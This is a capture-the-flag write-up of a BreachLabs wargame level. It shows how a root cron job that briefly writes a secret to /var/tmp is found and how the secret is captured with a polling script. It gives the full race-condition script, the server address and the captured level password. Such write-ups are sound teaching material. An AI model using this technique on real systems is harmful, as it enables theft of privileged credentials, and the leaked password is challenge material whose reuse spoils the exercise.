# BreachLabs: Ghost Track Level 20 - Cron Discovery

**Challenge:** Level 20 → 21  
**Date Completed:** August 31, 2026  
**Platform:** [BreachLabs](https://breachlab.org)

---

## Summary

Cron Discovery introduces scheduled task exploitation. The challenge requires identifying a cron job running as root, analyzing what it reads and writes, then capturing its output before it is deleted. Success demonstrates understanding of cron scheduling, file system operations, and race condition exploitation.

---

## Challenge Objective

**Goal:** Retrieve password for `ghost21` user  
**Context:** Something runs on a schedule as root; must find what, where it writes, and what it reads  
**Constraint:** Must capture output from a scheduled task before deletion

---

## Initial Access

### SSH Connection

Connected using password obtained from Level 19:
```
Target: 204.168.229.209:2222
User: ghost20
Access Method: SSH (password)
```

### Challenge Introduction

Challenge narrative stated:
- Something runs on a schedule as root
- Find what runs
- Find where it writes
- Find what it reads
- Scheduled tasks live in specific corners of /etc

---

## Cron Job Discovery

### Directory Navigation

Located system cron jobs in standard location:

```bash
cd /etc/cron.d
ls -alps
```

**Directory Contents:**
```
total 32
8 drwxr-xr-x 1 root root 4096 Jun 22 13:41 ./
8 drwxr-xr-x 1 root root 4096 Jun 22 14:06 ../
4 -rw-r--r-- 1 root root  102 Mar 23  2022 .placeholder
4 -rw-r--r-- 1 root root  201 Jan  8  2022 e2scrub_all
4 -rw-r--r-- 1 root root   38 Aug 28 14:26 ghost-level20
4 -rw-r--r-- 1 root root   50 Aug 28 14:26 ghost-residue-cleanup
```

**Finding:** Located `ghost-level20` crontab file in /etc/cron.d/.

### Cron Job Examination

Inspected ghost-level20 crontab:

```bash
cat ghost-level20
```

**Crontab Content:**
```
* * * * * root /opt/ghost-cron/job.sh
```

**Finding:** Job runs every minute as root, executing `/opt/ghost-cron/job.sh`.

---

## Job Script Analysis

### Script Location and Permissions

Navigated to cron job directory and listed contents:

```bash
cd /opt/ghost-cron/
ls -alps
```

**Directory Contents:**
```
total 16
4 drwxr-xr-x 2 root root 4096 Jun 22 13:41 ./
8 drwxr-xr-x 1 root root 4096 Jun 22 13:41 ../
4 -rwxr-xr-x 1 root root  121 Jun 22 13:41 job.sh
```

**Finding:** job.sh is executable by all users, owned by root.

### Script Content Examination

Examined the cron job script:

```bash
cat job.sh
```

**Script Content:**
```bash
#!/bin/bash
cat /etc/ghost-cron-secret > /var/tmp/ghost-cron-output 2>/dev/null
sleep 2
rm -f /var/tmp/ghost-cron-output
```

**Analysis:**
- Reads from `/etc/ghost-cron-secret` (readable only by root normally)
- Writes to `/var/tmp/ghost-cron-output`
- Sleeps for 2 seconds
- Deletes `/var/tmp/ghost-cron-output`

**Finding:** Credentials are written temporarily to `/var/tmp/ghost-cron-output` for 2 seconds before deletion.

---

## Output Capture

### Race Condition Exploitation

Created monitoring script to capture output during 2-second window:

```bash
cat > catch.sh <<'EOF'
#!/bin/bash
while true; do
    if [ -f /var/tmp/ghost-cron-output ]; then
        cp /var/tmp/ghost-cron-output /tmp/flag 2>/dev/null
        if [ -s /tmp/flag ]; then
            cat /tmp/flag
            exit 0
        fi
    fi
    sleep 0.01
done
EOF
```

**Script Components:**
- `while true` — Continuous monitoring loop
- `if [ -f /var/tmp/ghost-cron-output ]` — Check if output file exists
- `cp /var/tmp/ghost-cron-output /tmp/flag` — Copy before it's deleted
- `if [ -s /tmp/flag ]` — Verify file is not empty
- `sleep 0.01` — Poll every 10ms to catch file during 2-second window

### Script Execution

Made script executable and ran it:

```bash
chmod +x catch.sh
./catch.sh
```

**Output:**
```
Cr0n_R34ds
Flag Found - [REDACTED_FLAG]
```

**Finding:** Successfully captured password for ghost21 from root-owned file.

---

## Attack Chain Summary

```
SSH Connection (ghost20, password auth)
         ↓
Challenge Context (find scheduled task running as root)
         ↓
Navigate to /etc/cron.d
         ↓
Cron Job Discovery (ghost-level20 file)
         ↓
Parse Crontab (identify /opt/ghost-cron/job.sh)
         ↓
Script Analysis (reads /etc/ghost-cron-secret)
         ↓
Output Location Identification (/var/tmp/ghost-cron-output)
         ↓
Deletion Behavior Analysis (2-second window, then deleted)
         ↓
Monitoring Loop Creation (0.01s polling)
         ↓
Race Condition Exploitation (capture before deletion)
         ↓
File Copy (secure to /tmp/flag)
         ↓
Credential Extraction
         ↓
Challenge Complete
```

---

## Key Techniques & Concepts

1. **Cron Jobs** — Scheduled tasks in /etc/cron.d/ run at specified intervals
2. **Crontab Format** — `* * * * * user command` specifies minute, hour, day, month, weekday
3. **Root Execution** — Cron jobs specify user context (root in this case)
4. **File Permissions** — Root processes can read files inaccessible to regular users
5. **Temporary Output** — Script writes credentials temporarily before deletion
6. **Race Conditions** — Short time window between file creation and deletion
7. **Polling Loop** — Continuous monitoring captures file during brief existence
8. **File Operations** — Copy file to secure location while source is temporary

---

## Tools & Commands Used

```bash
# Navigate to cron directory
cd /etc/cron.d
ls -alps

# Examine crontab file
cat ghost-level20

# Navigate to job directory
cd /opt/ghost-cron/
ls -alps

# View script content
cat job.sh

# Create monitoring script
cat > catch.sh <<'EOF'
...
EOF

# Make executable
chmod +x catch.sh

# Run monitoring script
./catch.sh
```

---

## Lessons Learned

1. **Cron Job Exploitation** — Scheduled tasks can leak sensitive data
2. **File System Inspection** — /etc/cron.d/ reveals all system scheduled tasks
3. **Temporary Files** — Even brief file existence can be exploited
4. **Race Conditions** — Short windows of opportunity can be captured with tight polling
5. **Privilege Context** — Root-executed tasks access restricted files
6. **Output Redirection** — Cron jobs often write to temporary locations
7. **Timing Attacks** — 2-second window is sufficient for script-based capture

---

## References

- BreachLabs: [Ghost Track Series](https://breachlab.org/tracks/ghost)
- Cron: https://man7.org/linux/man-pages/man8/cron.8.html
- Crontab: https://man7.org/linux/man-pages/man5/crontab.5.html
- GTFOBins Crontab: https://gtfobins.org/gtfobins/crontab/

---

**Status:** ✅ Completed  
**Challenge Type:** Cron Job Exploitation & Race Condition  
**Key Learning:** Exploiting temporary file windows in scheduled tasks to access root-owned credentials
